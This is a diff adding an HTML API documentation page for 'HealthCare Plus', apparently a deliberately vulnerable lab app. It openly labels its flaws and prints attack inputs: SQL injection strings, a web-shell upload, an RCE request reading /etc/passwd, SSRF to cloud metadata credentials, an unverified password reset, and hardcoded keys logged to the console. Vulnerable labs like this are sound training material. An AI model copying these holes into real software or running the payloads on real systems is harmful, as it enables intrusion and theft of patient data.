@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>API Documentation - HealthCare Plus</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        .api-endpoint {
+            background: white;
+            padding: 20px;
+            margin-bottom: 20px;
+            border-radius: 8px;
+            border-left: 4px solid #0066cc;
+        }
+        .method {
+            display: inline-block;
+            padding: 5px 10px;
+            border-radius: 3px;
+            font-weight: bold;
+            margin-right: 10px;
+        }
+        .method.get { background: #28a745; color: white; }
+        .method.post { background: #007bff; color: white; }
+        .method.put { background: #ffc107; color: black; }
+        .method.delete { background: #dc3545; color: white; }
+        code {
+            background: #f4f4f4;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-family: 'Courier New', monospace;
+        }
+        pre {
+            background: #1a1a1a;
+            color: #0f0;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+        }
+    </style>
+</head>
+<body>
+    <nav class="navbar">
+        <div class="container">
+            <div class="logo">
+                <i class="fas fa-heartbeat"></i>
+                <span>HealthCare Plus</span>
+            </div>
+            <ul class="nav-links">
+                <li><a href="index.html">Home</a></li>
+                <li><a href="dashboard.html">Dashboard</a></li>
+                <li><a href="admin.html">Admin</a></li>
+                <li><a href="api-docs.html">API Docs</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <section style="padding: 60px 0;">
+        <div class="container">
+            <h1 style="color: #0066cc; margin-bottom: 10px;">API Documentation</h1>
+            <p style="color: #666; margin-bottom: 30px;">RESTful API for HealthCare Plus Platform</p>
+
+            <!-- Authentication Section -->
+            <div style="background: white; padding: 30px; border-radius: 10px; margin-bottom: 30px;">
+                <h2 style="color: #0066cc; margin-bottom: 20px;">Authentication</h2>
+                <p>All API requests require an API key. Include it in the header:</p>
+                <pre>X-API-Key: hcp_live_sk_a3b8c9d1e2f4g5h6i7j8k9l0m1n2o3p4</pre>
+                
+                <div style="background: #fff3cd; padding: 15px; border-radius: 5px; margin-top: 20px; border-left: 4px solid #ffc107;">
+                    <strong>⚠️ Security Issues:</strong>
+                    <ul style="margin-top: 10px;">
+                        <li>API key exposed in documentation</li>
+                        <li>No rate limiting</li>
+                        <li>Basic authentication only</li>
+                        <li>No HTTPS enforcement</li>
+                        <li>CORS: * (allows all origins)</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Base URL -->
+            <div style="background: white; padding: 20px; border-radius: 10px; margin-bottom: 30px;">
+                <h3>Base URL</h3>
+                <pre>https://api.healthcareplus.com/v1</pre>
+                <p style="margin-top: 10px;"><strong>Alternative (No HTTPS):</strong></p>
+                <pre>http://internal-api.healthcareplus.local:8080/v1</pre>
+            </div>
+
+            <!-- Patients API -->
+            <h2 style="color: #0066cc; margin: 40px 0 20px;">Patients API</h2>
+            
+            <div class="api-endpoint">
+                <h3><span class="method get">GET</span> /patients</h3>
+                <p>Retrieve all patients (IDOR vulnerability - no authorization)</p>
+                <pre>
+curl -X GET "https://api.healthcareplus.com/v1/patients" \
+  -H "X-API-Key: hcp_live_sk_a3b8c9d1e2f4g5h6i7j8k9l0m1n2o3p4"
+                </pre>
+                <p><strong>Response:</strong></p>
+                <pre>
+{
+  "patients": [
+    {
+      "id": 1001,
+      "name": "John Doe",
+      "ssn": "345-67-8901",
+      "dob": "1979-03-15",
+      "address": "123 Main St",
+      "phone": "555-0101",
+      "diagnosis": "Hypertension",
+      "medications": ["Lisinopril 10mg"],
+      "insurance": "BlueCross PPO",
+      "balance": 1250.00
+    }
+  ]
+}
+                </pre>
+            </div>
+
+            <div class="api-endpoint">
+                <h3><span class="method get">GET</span> /patients/{id}</h3>
+                <p>Get patient by ID (No access control - IDOR vulnerability)</p>
+                <pre>
+curl -X GET "https://api.healthcareplus.com/v1/patients/1001" \
+  -H "X-API-Key: hcp_live_sk_a3b8c9d1e2f4g5h6i7j8k9l0m1n2o3p4"
+                </pre>
+                <p>⚠️ <strong>Vulnerability:</strong> Anyone can access any patient by incrementing ID</p>
+            </div>
+
+            <div class="api-endpoint">
+                <h3><span class="method post">POST</span> /patients</h3>
+                <p>Create new patient (Mass assignment vulnerability)</p>
+                <pre>
+curl -X POST "https://api.healthcareplus.com/v1/patients" \
+  -H "Content-Type: application/json" \
+  -H "X-API-Key: hcp_live_sk_a3b8c9d1e2f4g5h6i7j8k9l0m1n2o3p4" \
+  -d '{
+    "name": "Jane Doe",
+    "role": "admin",
+    "isVerified": true,
+    "creditLimit": 999999
+  }'
+                </pre>
+                <p>⚠️ <strong>Vulnerability:</strong> No input validation - can set admin role and arbitrary fields</p>
+            </div>
+
+            <!-- Doctors API -->
+            <h2 style="color: #0066cc; margin: 40px 0 20px;">Doctors API</h2>
+            
+            <div class="api-endpoint">
+                <h3><span class="method get">GET</span> /doctors?search={query}</h3>
+                <p>Search doctors (SQL Injection vulnerability)</p>
+                <pre>
+# Normal request:
+curl "https://api.healthcareplus.com/v1/doctors?search=Smith"
+
+# SQL Injection:
+curl "https://api.healthcareplus.com/v1/doctors?search=' OR '1'='1"
+curl "https://api.healthcareplus.com/v1/doctors?search=' UNION SELECT username,password FROM users--"
+                </pre>
+            </div>
+
+            <!-- Users API -->
+            <h2 style="color: #0066cc; margin: 40px 0 20px;">Users API</h2>
+            
+            <div class="api-endpoint">
+                <h3><span class="method post">POST</span> /users/login</h3>
+                <p>User login (Credentials in GET parameters)</p>
+                <pre>
+# Vulnerable login:
+GET https://api.healthcareplus.com/v1/users/login?username=admin&password=admin123
+
+# Credentials logged in server logs and browser history!
+                </pre>
+            </div>
+
+            <div class="api-endpoint">
+                <h3><span class="method post">POST</span> /users/reset-password</h3>
+                <p>Password reset (No verification)</p>
+                <pre>
+curl -X POST "https://api.healthcareplus.com/v1/users/reset-password" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "userId": 1,
+    "newPassword": "hacked123"
+  }'
+                </pre>
+                <p>⚠️ <strong>Vulnerability:</strong> Can reset any user's password without verification</p>
+            </div>
+
+            <!-- File Upload API -->
+            <h2 style="color: #0066cc; margin: 40px 0 20px;">File Upload API</h2>
+            
+            <div class="api-endpoint">
+                <h3><span class="method post">POST</span> /upload</h3>
+                <p>Upload file (Unrestricted file upload vulnerability)</p>
+                <pre>
+curl -X POST "https://api.healthcareplus.com/v1/upload" \
+  -H "X-API-Key: hcp_live_sk_a3b8c9d1e2f4g5h6i7j8k9l0m1n2o3p4" \
+  -F "file=@shell.php" \
+  -F "patientId=1001"
+
+# Uploaded to: /uploads/1001/shell.php
+# Accessible at: https://api.healthcareplus.com/uploads/1001/shell.php
+                </pre>
+                <p>⚠️ <strong>Vulnerabilities:</strong></p>
+                <ul>
+                    <li>No file type validation</li>
+                    <li>No size limit</li>
+                    <li>Files executed by server (.php, .jsp, .asp)</li>
+                    <li>Path traversal possible</li>
+                </ul>
+            </div>
+
+            <!-- Admin API -->
+            <h2 style="color: #0066cc; margin: 40px 0 20px;">Admin API</h2>
+            
+            <div class="api-endpoint">
+                <h3><span class="method delete">DELETE</span> /admin/users/{id}</h3>
+                <p>Delete user (No authorization check)</p>
+                <pre>
+curl -X DELETE "https://api.healthcareplus.com/v1/admin/users/1" \
+  -H "X-API-Key: hcp_live_sk_a3b8c9d1e2f4g5h6i7j8k9l0m1n2o3p4"
+                </pre>
+                <p>⚠️ <strong>Vulnerability:</strong> Missing function level access control - any user can delete admin</p>
+            </div>
+
+            <div class="api-endpoint">
+                <h3><span class="method post">POST</span> /admin/execute</h3>
+                <p>Execute system command (RCE vulnerability)</p>
+                <pre>
+curl -X POST "https://api.healthcareplus.com/v1/admin/execute" \
+  -H "Content-Type: application/json" \
+  -H "X-API-Key: hcp_live_sk_a3b8c9d1e2f4g5h6i7j8k9l0m1n2o3p4" \
+  -d '{
+    "command": "cat /etc/passwd"
+  }'
+                </pre>
+                <p>⚠️ <strong>Vulnerability:</strong> Remote Code Execution - can run any system command</p>
+            </div>
+
+            <!-- Webhooks -->
+            <h2 style="color: #0066cc; margin: 40px 0 20px;">Webhooks (SSRF)</h2>
+            
+            <div class="api-endpoint">
+                <h3><span class="method post">POST</span> /webhooks/trigger</h3>
+                <p>Trigger webhook (SSRF vulnerability)</p>
+                <pre>
+curl -X POST "https://api.healthcareplus.com/v1/webhooks/trigger" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+  }'
+                </pre>
+                <p>⚠️ <strong>Vulnerability:</strong> Server-Side Request Forgery - can access internal resources</p>
+            </div>
+
+            <!-- Error Responses -->
+            <h2 style="color: #0066cc; margin: 40px 0 20px;">Error Responses</h2>
+            
+            <div style="background: white; padding: 20px; border-radius: 10px;">
+                <p>Errors expose sensitive information:</p>
+                <pre>
+{
+  "error": "Database connection failed",
+  "details": "SQLSTATE[HY000] [1045] Access denied for user 'root'@'localhost' (using password: YES)",
+  "query": "SELECT * FROM patients WHERE id = 1001",
+  "database": "healthcare_plus_db",
+  "host": "db.healthcareplus.internal:3306",
+  "trace": [
+    "/var/www/healthcareplus/api/patients.php:42",
+    "/var/www/healthcareplus/includes/database.php:128"
+  ]
+}
+                </pre>
+            </div>
+
+            <!-- Testing Section -->
+            <h2 style="color: #0066cc; margin: 40px 0 20px;">Interactive API Tester</h2>
+            
+            <div style="background: white; padding: 30px; border-radius: 10px;">
+                <div style="margin-bottom: 20px;">
+                    <label><strong>Method:</strong></label>
+                    <select id="apiMethod" style="width: 100%; padding: 10px; margin-top: 5px; border: 2px solid #ddd; border-radius: 5px;">
+                        <option value="GET">GET</option>
+                        <option value="POST">POST</option>
+                        <option value="PUT">PUT</option>
+                        <option value="DELETE">DELETE</option>
+                    </select>
+                </div>
+                
+                <div style="margin-bottom: 20px;">
+                    <label><strong>Endpoint:</strong></label>
+                    <input type="text" id="apiEndpoint" placeholder="/patients/1001" style="width: 100%; padding: 10px; margin-top: 5px; border: 2px solid #ddd; border-radius: 5px;">
+                </div>
+                
+                <div style="margin-bottom: 20px;">
+                    <label><strong>Body (JSON):</strong></label>
+                    <textarea id="apiBody" rows="6" style="width: 100%; padding: 10px; margin-top: 5px; border: 2px solid #ddd; border-radius: 5px; font-family: monospace;"></textarea>
+                </div>
+                
+                <button onclick="testAPI()" class="btn btn-primary">Send Request</button>
+                
+                <div id="apiResponse" style="margin-top: 20px;"></div>
+            </div>
+        </div>
+    </section>
+
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-bottom">
+                <p>&copy; 2024 HealthCare Plus. All rights reserved.</p>
+                <p class="debug-info">API Version: 1.2.5 | Rate Limiting: Disabled | CORS: * (All Origins)</p>
+            </div>
+        </div>
+    </footer>
+
+    <script src="script.js"></script>
+    <script>
+        function testAPI() {
+            const method = document.getElementById('apiMethod').value;
+            const endpoint = document.getElementById('apiEndpoint').value;
+            const body = document.getElementById('apiBody').value;
+            const response = document.getElementById('apiResponse');
+            
+            response.innerHTML = `
+                <h3>Simulated Response:</h3>
+                <pre>
+Request:
+${method} https://api.healthcareplus.com/v1${endpoint}
+X-API-Key: ${API_CONFIG.apiKey}
+Content-Type: application/json
+
+${body ? 'Body:\n' + body : ''}
+
+Response (200 OK):
+{
+  "success": true,
+  "message": "Request processed",
+  "data": ${JSON.stringify(DATABASE.patients[0], null, 2)},
+  "debug": {
+    "sql_query": "SELECT * FROM patients WHERE id = 1001",
+    "execution_time": "0.042s",
+    "server": "prod-api-01",
+    "user": "root"
+  }
+}
+                </pre>
+            `;
+        }
+        
+        console.log('=== API DOCUMENTATION ===');
+        console.log('Live API Key:', API_CONFIG.apiKey);
+        console.log('Secret Key:', API_CONFIG.secretKey);
+        console.log('Admin Token:', API_CONFIG.adminToken);
+    </script>
+</body>
+</html>
